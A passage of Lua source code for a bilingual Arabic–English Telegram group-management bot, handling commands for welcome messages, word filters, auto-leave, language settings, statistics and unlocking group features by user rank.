else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ID has been enable  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱلٱيـدي فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:del('loolIQ:id:mute'..msg.chat_id_)
end end end
if (text and text == 'disable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Disable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get('loolIQ:id:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ID is already disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱيـدي بٱڵتاكيد مۧعطڵ ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ID has been disable  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱلٱيـدي فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:set('loolIQ:id:mute'..msg.chat_id_,true)
end end end
--     Source loolIQ     --
if is_sudo(msg) then
local text = msg.content_.text_:gsub('المغادره التلقائيه','Autoleave')
if text:match("^[Aa]utoleave (.*)$") then
local status = {string.match(text, "^([Aa]utoleave) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if DevAbs:get(loolIQ..'autoleave') == "On" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Auto Leave is now active ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمغٱدرة ٱڵتڵقٱئية بٱڵتاكيد مۧفعڵـة ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Auto Leave has been actived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵمغٱدرة ٱڵتڵقٱئية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
DevAbs:set(loolIQ..'autoleave','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if DevAbs:get(loolIQ..'autoleave') == "Off" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Auto Leave is now deactive ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمغٱدرة ٱڵتڵقٱئية بٱڵتاكيد مۧعطڵـة', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Auto leave has been deactived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵمغٱدرة ٱڵتڵقٱئية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
DevAbs:set(loolIQ..'autoleave','Off')
end
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('رد الخاص','Clerk')
if text:match("^[Cc]lerk (.*)$") then
local status = {string.match(text, "^([Cc]lerk) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if DevAbs:get(loolIQ..'clerk') == "On" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Clerk is now active ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ رد خٱص ٱڵـبوت بٱڵتاكيد مۧفعڵ ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Clerk has been actived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ رد خٱص ٱڵـبوت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'clerk','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if DevAbs:get(loolIQ..'clerk') == "Off" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Clerk is now deactive ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ رد خٱص ٱڵـبوت بٱڵتاكيد مۧعطڵ ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Auto leave has been deactived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ رد خٱص ٱڵـبوت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ..'clerk','Off')
end
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etlink$") or text:match("^ضع رابط$") or text:match("^وضع الرابط$")  then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Plese send your group link now ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱرسـڵ رآبـط ٱڵـمجـمۄعة ڵـيتم حفظة', 1, 'md')
end
DevAbs:set(loolIQ.."bot:group:link"..msg.chat_id_, 'waiting')
end
--     Source loolIQ     --
if text:match("^الدعم$") or text:match("^المطور$")  then
local link = DevAbs:get(loolIQ.."bot:supports:link")
if link then
if link:match("https://") then
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ <b>Support Link</b> :\n\n " .. link, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم ٱرسٱڵ بيٱنٱتك ڵڵـمطور \n❗️🦠 ⌯ سوف يٱتي في ٱقرب وقت \n❗️💎 ⌯ يمكنك طڵب ٱڵمسٱعدة \n❗️🧬 ⌯ من كروب ٱڵـدعم \n〰️➖〰️➖〰️➖〰️➖〰️\n•- " .. link, 1, "html")
end
elseif DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ <b>Support Bot ID</b> : @" .. link, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم ٱرسٱڵ بيٱنٱتك ڵڵـمطور \n❗️🦠 ⌯ سوف يٱتي في ٱقرب وقت \n❗️💎 ⌯ يمكنك طڵب ٱڵمسٱعدة \n❗️🧬 ⌯ من بوت توٱصڵ ٱڵـمطور \n〰️➖〰️➖〰️➖〰️➖〰️\n•- @" .. link, 1, "html")
end
elseif DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ *Support link* is not found ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ڵم يتم تعيين ٱڵـدعم \n❗️🔑 ⌯ ٱرسل ( ضع دعم ) ڵڵحفظ ', 1, 'md')
end
end
--     Source loolIQ     --

--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ww]elcome on$") or text:match("^تفعيل الترحيب$") then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, ' ❗️☻ Welcome activated  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵترحيب فيۧ ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:set(loolIQ.."bot:welcome"..msg.chat_id_,true)
end
if text:match("^[Ww]elcome off$") or text:match("^تعطيل الترحيب$") then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Welcome deactivated ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵترحيب فيۧ ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:del(loolIQ.."bot:welcome"..msg.chat_id_)
end
if text:match("^ضع ترحيب (.*)$")  then
local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Welcome text has been saved \n\n❗️🔑 ⌯  Welcome text :\n\n'..welcome[2], 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم تعيين ٱڵترحيب ٱڵـجـډيـډ \n❗️🔑 ⌯ ٱڵترحيب ٱڵـجـډيـډ هو :\n〰️➖〰️➖〰️➖〰️➖〰️\n'..welcome[2], 1, 'md')
end
DevAbs:set(loolIQ..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^[Dd]el welcome$") or text:match("^حذف الترحيب$") or text:match("^حذف ترحيب$") then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Welcome text has been removed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حـذف ٱڵترحيب \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
DevAbs:del(loolIQ..'welcome:'..msg.chat_id_)
end
if text:match("^[Gg]et welcome$") or text:match("^جلب الترحيب$") or text:match("^جلب ترحيب$") then
local wel = DevAbs:get(loolIQ..'welcome:'..msg.chat_id_)
if wel then
Dev_Abs(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Welcome text not found \n❗️🔑 ⌯ Send (Get Welcome) to save', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ڵم يتم وضع ٱڵترحيب \n❗️🔑 ⌯ ٱرسل ( ضع ترحيب ) ڵڵحفظ ', 1, 'md')
end
end
end
end
if text:match("^ضع ترحيب$") or text:match("^وضع ترحيب$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ضع ترحيب + الكليشة \n❗️🔑 ⌯ ٱستخدم ٱڵدوٱڵ ٱلٱتية ڵڵطبع \n〰️➖〰️➖〰️➖〰️➖〰️\nusername ⇝ ڵطبع ٱڵمعرف \nfirstname ⇝ ڵطبع ٱلٱسم ٱلٱوڵ \nlastname ⇝ ڵطبع ٱلٱسم ٱلٱخير ', 1, 'md') 
end
--     Source loolIQ     --
if is_sudo(msg) then
local text = msg.content_.text_:gsub('ضع رد الخاص','Set clerk')
if text:match("^[Ss]et clerk (.*)$") then
local clerk = {string.match(text, "^([Ss]et clerk) (.*)$")}
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Clerk text has been saved \n❗️🔑 ⌯ Welcome text :\n\n'..clerk[2], 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم تعيين رد ٱڵخٱص ڵڵـبوت \n❗️🔑 ⌯ رد خٱص ٱڵـبوت هو :\n〰️➖〰️➖〰️➖〰️➖〰️\n'..clerk[2], 1, 'md')
end
DevAbs:set(loolIQ..'textsec',clerk[2])
end
if text:match("^[Dd]el clerk$") or text:match("^حذف رد الخاص$") or text:match("^مسح رد الخاص$") then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Clerk text has been removed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حـذف رد ٱڵخٱص ',1, 'md')
end
DevAbs:del(loolIQ..'textsec')
end
if text:match("^[Gg]et clerk$") or text:match("^جلب رد الخاص$") or text:match("^جلب كليشه ستارت$") then
local cel = DevAbs:get(loolIQ..'textsec')
if cel then
Dev_Abs(msg.chat_id_, msg.id_, 1, cel, 1, 'md')
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Clerk text not found ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ڵم يتم وضع رد ڵڵخٱص \n❗️🔑 ⌯ ٱرسل ( ضع رد الخاص ) ڵڵحفظ', 1, 'md')
end
end
end
end
--     Source loolIQ     --
if text:match("^[Aa]ction (.*)$") and is_sudo(msg) then
local lockpt = {string.match(text, "^([Aa]ction) (.*)$")}
if lockpt[2] == "typing" then
sendaction(msg.chat_id_, 'Typing')
end
if lockpt[2] == "video" then
sendaction(msg.chat_id_, 'RecordVideo')
end
if lockpt[2] == "voice" then
sendaction(msg.chat_id_, 'RecordVoice')
end
if lockpt[2] == "photo" then
sendaction(msg.chat_id_, 'UploadPhoto')
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilter (.*)$") or text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local abs = (loolIQ..'bot:filters:'..msg.chat_id_)
DevAbs:hset(abs, name,'newword')
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯  Word ( "..name.." ) has been filtered ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." ) تـۖم منعهٱ\n❗️🔑 ⌯ فـي ٱڵـمجموعة ", 1, 'md')
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter (.*)$") or text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local abs = (loolIQ..'bot:filters:'..msg.chat_id_)
if not DevAbs:hget(loolIQ..abs, name) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Word ( "..name.." ) is not in filterlist ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." ) ڵيست ممنوعة\n❗️🔑 ⌯ فـي ٱڵـمجموعة ", 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Word ( "..name.." ) removed from filterlist ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." ) تـۖم ٱڵغٱء منعهٱ\n❗️🔑 ⌯ فـي ٱڵـمجموعة ", 1, 'md')
end
DevAbs:hdel(abs, name)
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilteer all (.*)$") or text:match("^فلتر عام (.*)$") then
local filters = {string.match(text, "^([Ff]Filteer all) (.*)$")}
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local abs = (loolIQ..'bot:freewords:')
DevAbs:hset(abs, name,'newword')
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Word ( "..name.." )\n❗️🔑 ⌯ has been filtered all ", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." ) تـۖم منعهٱ\n❗️🔑 ⌯ فـي جميع ٱڵـمجموعٱت ", 1, 'html')
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter all (.*)$") or text:match("^الغاء فلتر عام (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter all) (.*)$")}
local rwss = {string.match(text, "^(الغاء فلتر عام) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local abs = (loolIQ..'bot:freewords:')
if not DevAbs:hget(abs, name)then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Word ( "..name.." )\n❗️🔑 ⌯ is not in filtered all ", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." ) ڵيست ممنوعة\n❗️🔑 ⌯ فـي جميع ٱڵـمجموعٱت ", 1, 'html')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Word ( "..name.." )\n❗️🔑 ⌯ removed from filtered all ", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵكڵمة ( "..name.." )  تـۖم ٱڵغٱء منعهٱ\n❗️🔑 ⌯ فـي جميع ٱڵـمجموعٱت ", 1, 'html')
end
DevAbs:hdel(abs, name)
end
end
end
--     Source loolIQ     --

--     Source loolIQ     --
if text:match("^[Ss]tats$") or text:match("^الاحصائيات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local gps = DevAbs:scard(loolIQ.."bot:groups")
local users = DevAbs:scard(loolIQ.."bot:userss")
local allmgs = DevAbs:get(loolIQ.."bot:allmsgs")
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎒 ⌯ Status bot \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ Groups : ( '..gps..' )\n❗️🧬 ⌯ Users : ( '..users..' )\n❗️🦠 ⌯ Msg received : ( '..allmgs..' )\n〰️➖〰️➖〰️➖〰️➖〰️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎒 ⌯ ٱحصٱئيٱت ٱڵـبوت \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ عدد ٱڵمجموعٱت : ( '..gps..' )\n❗️🧬 ⌯ عدد ٱلٱعضٱء : ( '..users..' )\n❗️🦠 ⌯ عدد رسٱئڵ ٱڵمجموعٱت : ( '..allmgs..' )\n〰️➖〰️➖〰️➖〰️➖〰️', 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^[Rr]esgp$") or text:match("^تنظيف الكروبات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Nubmper of groups bot has been update ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تنظيف ٱڵكروبٱت ٱڵوهمية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 'md')
end
DevAbs:del(loolIQ.."bot:groups")
end
--     Source loolIQ     --
if text:match("^[Nn]amegp$") or text:match("^اسم المجموعه$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱسم ٱڵمجموعة ⌯» ("..title_name(msg.chat_id_)..")", 1, 'md')
end 
--     Source loolIQ     --
if text:match("^[Rr]esmsg$") or text:match("^تنظيف الرسائل$") and is_sudo(msg) then
DevAbs:del(loolIQ.."bot:allmsgs")
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ All msg received has been reset ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تنظيف عدد رسٱئڵ ٱڵكروبٱت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 'md')
end
end
--     Source loolIQ     --
if text:match("^[Ss]etlang (.*)$") or text:match("^ضع اللغه (.*)$") or text:match("^وضع اللغه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local langs = {string.match(text, "^(.*) (.*)$")}
if langs[2] == "arabic" or langs[2] == "العربية" then
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵڵغة ٱڵـعربية بٱڵفعـل مۧوضوعة  فيۧ ٱڵمجـمۄعة ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع ٱڵڵغة ٱڵـعربية فيۧ ٱڵمجـمۄعة ', 1, 'md')
DevAbs:del(loolIQ..'lang:gp:'..msg.chat_id_)
end
end
if langs[2] == "english" or langs[2] == "الانكليزية" then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Language Bot is already English* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Language Bot has been changed to English* ', 1, 'md')
DevAbs:set(loolIQ..'lang:gp:'..msg.chat_id_,true)
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unlockpt = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpt[2] == "edit" or unlockpts[2] == "التعديل" then
if DevAbs:get(loolIQ..'editmsg'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـتعديڵ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتعديڵ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if DevAbs:get(loolIQ..'farsi'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـفٱرسية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ..'farsi'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـفٱرسية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if DevAbs:get(loolIQ..'farsiban'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـفٱرسية بٱڵطرد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 67, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ..'farsiban'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـفٱرسية بٱڵطرد بٱڵفعـل مۧفتوحة', 1, 'md')
end
end
if unlockpt[2] == "cmd" or unlockpts[2] == "الشارحه" then
if DevAbs:get(loolIQ..'bot:cmds'..msg.chat_id_) then
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـشٱرحة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ..'bot:cmds'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـشٱرحة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpt[2] == "bots" or unlockpts[2] == "البوتات" then
if DevAbs:get(loolIQ..'bot:bots:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock bots', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـبوتٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:bots:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ bots is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـبوتٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
if DevAbs:get(loolIQ..'bot:bots:ban'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock bots ban', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـبوتٱت بٱڵطرد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 66, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:bots:ban'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ bots is already unlocked ban ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـبوتٱت بٱڵطرد بٱڵفعـل مۧفتوحة', 1, 'md')
end
end
end
